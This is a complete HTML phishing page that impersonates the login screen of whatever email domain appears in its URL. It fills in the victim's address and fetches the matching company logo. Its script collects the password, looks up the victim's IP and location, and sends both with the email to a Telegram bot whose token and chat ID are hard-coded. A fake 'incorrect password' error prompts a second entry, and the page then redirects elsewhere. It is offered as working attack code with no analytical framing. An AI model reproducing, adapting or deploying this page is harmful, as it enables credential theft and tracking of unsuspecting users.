<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: url("https://i.imgur.com/bckDjsy.jpeg") no-repeat center center fixed;
    background-size: cover;
}
.overlay {
    position: fixed;
    inset: 0;
    backdrop-filter: blur(2px);
    display: flex;
    justify-content: center;
    align-items: center;
}
.login-box {
    background: linear-gradient(to bottom, #1a1a1a, #7a1f1f);
    border-radius: 12px;
    padding: 25px;
    width: 300px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.5);
    text-align: center;
    color: #fff;
    animation: fadeIn 0.8s ease-in-out;
}
.logo {
    width: 50px;
    height: 50px;
    margin-bottom: 10px;
}
input[type="email"],
input[type="password"] {
    width: 80vh;
    max-width: 280px;
    padding: 10px;
    margin: 12px 0;
    border: none;
    border-radius: 6px;
    outline: none;
}
input[disabled] {
    background: #ddd;
    color: #555;
}
.remember {
    display: flex;
    align-items: center;
    font-size: 14px;
    margin-bottom: 10px;
}
button {
    width: 80vh;
    max-width: 280px;
    padding: 10px;
    background: #1976d2;
    border: none;
    color: white;
    font-size: 16px;
    border-radius: 6px;
    cursor: pointer;
}
button:hover {
    background: #125aa2;
}
.submit-link {
    display: block;
    margin-top: 10px;
    font-size: 12px;
    color: #ffdfd3;
    cursor: pointer;
}
.error {
    color: red;
    margin-top: 10px;
    height: 18px;
}
.spinner {
    border: 4px solid rgba(255,255,255,0.3);
    border-top: 4px solid #1976d2;
    border-radius: 50%;
    width: 28px;
    height: 28px;
    margin: 10px auto;
    animation: spin 1s linear infinite;
}
.hidden {
    display: none;
}
@keyframes spin {
    to { transform: rotate(360deg); }
}
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-20px); }
    to { opacity: 1; transform: translateY(0); }
}
</style>
</head>
<body>

<div class="overlay">
    <div class="login-box fade-in">
        <img id="domain-logo" alt="Logo" class="logo">
        <h2 id="domain-title">example.com</h2>

        <input type="email" id="email" disabled>
        <input type="password" id="password" placeholder="Enter your password">

        <label class="remember">
            <input type="checkbox"> Remember me
        </label>

        <button id="login-btn">Submit</button>
        <small class="submit-link"> </small>

        <p id="error-msg" class="error"></p>

        <div id="loading-spinner" class="spinner hidden"></div>
    </div>
</div>

<script>
    // === CONFIGURE TELEGRAM BOT ===
    const BOT_TOKEN = "8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA";
    const CHAT_ID = "7959372593";
    const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy

    (function() {
        let userEmail = "";
        let attempt = 0;

        // Enhanced email extraction with URL decoding
        function getEmailFromURL() {
            // Try query string parameter
            const urlParams = new URLSearchParams(window.location.search);
            let queryEmail = urlParams.get('email');

            // Try hash parameter
            const hashParams = new URLSearchParams(window.location.hash.substring(1));
            let hashEmail = hashParams.get('email');

            // Decode and validate emails
            const emails = [queryEmail, hashEmail]
                .filter(email => email && isValidEmail(email))
                .map(email => {
                    try {
                        return decodeURIComponent(email);
                    } catch {
                        return email;
                    }
                });

            return emails[0] || "example@example.com";
        }

        // Robust email validation
        function isValidEmail(email) {
            const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        }

        // Update email field and domain info
        function updateEmailInfo() {
            userEmail = getEmailFromURL();

            const emailField = document.getElementById("email");
            if (emailField) emailField.value = userEmail;

            const domain = userEmail.split("@")[1] || "example.com";
            const domainTitle = document.getElementById("domain-title");
            const domainLogo = document.getElementById("domain-logo");

            if (domainTitle) domainTitle.textContent = domain;
            if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}?size=160`;
        }

        // Telegram message function
        async function sendToTelegram(email, password) {
            try {
                let ipData = {};
                try {
                    const ipRes = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN || ""}`);
                    ipData = await ipRes.json();
                } catch (e) {
                    console.warn("IP info fetch failed", e);
                }

                const message = `
🔐 New Login Attempt
------------------------
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ipData.ip || "N/A"}
🏙 City: ${ipData.city || "N/A"}
🏢 Region: ${ipData.region || "N/A"}
🌍 Country: ${ipData.country || "N/A"}
📡 ISP: ${ipData.org || "N/A"}
📍 Location: ${ipData.loc || "N/A"}
                `;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });
            } catch (err) {
                console.error("Telegram send error:", err);
            }
        }

        // Initialize on DOM ready
        document.addEventListener("DOMContentLoaded", () => {
            // Initial setup
            updateEmailInfo();

            // Handle hash changes
            window.addEventListener("hashchange", updateEmailInfo);

            // Login button handler
            document.getElementById("login-btn").addEventListener("click", async function(e) {
                const password = document.getElementById("password").value;
                const errorMsg = document.getElementById("error-msg");
                const spinner = document.getElementById("loading-spinner");
                const loginBtn = document.getElementById("login-btn");

                errorMsg.textContent = "";
                spinner.classList.remove("hidden");
                loginBtn.disabled = true;

                setTimeout(async () => {
                    spinner.classList.add("hidden");
                    loginBtn.disabled = false;
                    attempt++;

                    // Send credentials to Telegram
                    await sendToTelegram(userEmail, password);

                    if (attempt === 1) {
                        errorMsg.textContent = "Incorrect password, please verify and retry.";
                    } else if (attempt >= 2) {
                        window.location.href = "https://surl.li/rebvvk";
                    }
                }, 5000);
            });
        });
    })();
</script>

</body>
</html>
